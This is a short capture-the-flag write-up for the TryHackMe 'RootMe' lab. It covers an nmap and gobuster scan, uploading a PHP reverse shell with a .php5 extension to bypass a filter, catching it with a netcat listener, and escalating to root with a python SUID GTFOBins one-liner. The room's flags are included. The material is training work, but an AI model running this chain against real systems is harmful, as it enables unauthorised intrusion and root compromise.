# Rootme || Try hack me
# irony  || May, 3 2021

ip = 10.10.114.31

1. namp scan 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 20:19 IST
Nmap scan report for 10.10.114.31
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp   open     http         Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
3920/tcp filtered exasoftport1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.57 seconds


```

starting with website scan with go buster

```
gobuster dir -u http://10.10.114.31/ -w /usr/share/dirb/wordlists/common.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.114.31/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/05/03 21:15:53 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2021/05/03 21:17:52 Finished
===============================================================

```

i went to the /panel saw that there is a upload system 
so i uploaded a php reverse shell with extension .php5 and it worked

then started a litenser
```
nc -lnvp 1234

```
then 
```
curl 'http://10.10.114.31/uploads/php_reverse_shell.php5'
```

after getting the reverse shell 

i searched for the user.txt file 

```
find / -type f -name user.txt 2> /dev/null
/var/www/user.txt
cat /var/www/user.txt

THM{y0u_g0t_a_sh3ll}
```

Now trying to escalate our privilege

https://gtfobins.github.io/gtfobins/python/#suid

```
find / -user root -perm /4000
/usr/bin/python

cd /usr/bin/
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

cd /root
ls
root.txt
cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```

--------------------------------------------END-------------------------------------------------------